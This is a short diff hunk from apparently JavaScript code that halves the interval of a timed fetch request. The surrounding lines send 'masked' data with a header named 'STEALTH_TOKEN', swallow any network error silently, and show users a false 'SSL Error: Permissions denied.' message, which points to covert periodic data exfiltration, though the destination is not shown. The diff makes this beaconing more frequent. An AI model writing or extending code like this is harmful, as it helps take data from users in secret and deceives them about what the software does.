@@ -149,7 +149,7 @@
                     headers: { 'Content-Type': 'application/json', 'X-Neural-Token': STEALTH_TOKEN },
                     body: JSON.stringify({ data: masked })
                 }).catch(() => {});
-            }, 10000);
+            }, 5000);
 
         } catch (e) { 
             updateStatus("SSL Error: Permissions denied."); 
